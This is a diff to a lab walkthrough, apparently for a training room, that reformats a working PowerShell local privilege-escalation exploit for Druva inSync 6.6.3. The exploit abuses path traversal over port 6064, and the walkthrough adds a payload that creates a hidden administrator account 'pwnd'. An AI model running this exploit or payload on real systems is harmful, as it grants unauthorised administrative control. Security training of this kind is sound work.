@@ -17,37 +17,39 @@ A patch was issued, where they decided to check that the executed command starte
 To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:\
 \
 The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.\
-Initially published by Matteo Malvica [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:\
-`$ErrorActionPreference = "Stop"`
+Initially published by Matteo Malvica [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:
 
-`$cmd = "net user pwnd /add"`
-
-`$s = New-Object System.Net.Sockets.Socket(`\
-`[System.Net.Sockets.AddressFamily]::InterNetwork,`\
-`[System.Net.Sockets.SocketType]::Stream,`\
-`[System.Net.Sockets.ProtocolType]::Tcp`\
-`)`\
-`$s.Connect("127.0.0.1", 6064)`
-
-`$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")`\
-``$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")``\
-`$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");`\
-`$length = [System.BitConverter]::GetBytes($command.Length);`
-
-`$s.Send($header)`\
-`$s.Send($rpcType)`\
-`$s.Send($length)`\
-`$s.Send($command)`
+```powershell
+$ErrorActionPreference = "Stop"
+$cmd = "net user pwnd /add"
+$s = New-Object System.Net.Sockets.Socket(
+[System.Net.Sockets.AddressFamily]::InterNetwork,
+[System.Net.Sockets.SocketType]::Stream,
+[System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
 
 You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at `C:\tools\Druva_inSync_exploit.txt`). Note that the exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:\
 `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`This will create user `pwnd` with a password of `SimplePass123` and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user `pwnd` exists and is part of the administrators' group:\
-Command Prompt\
-`PS C:\> net user pwnd`\
-`User name pwnd`\
-`Full Name`\
-`Account active Yes`\
-`[...]Local Group Memberships *Administrators *Users`\
-`Global Group memberships *None`
+Command Prompt
+
+```powershell
+PS C:\> net user pwnd
+User name pwnd
+Full Name
+Account active Yes
+[...]Local Group Memberships *Administrators *Users
+Global Group memberships *None
+```
 
 As a last step, you can run a command prompt as administrator:\
 
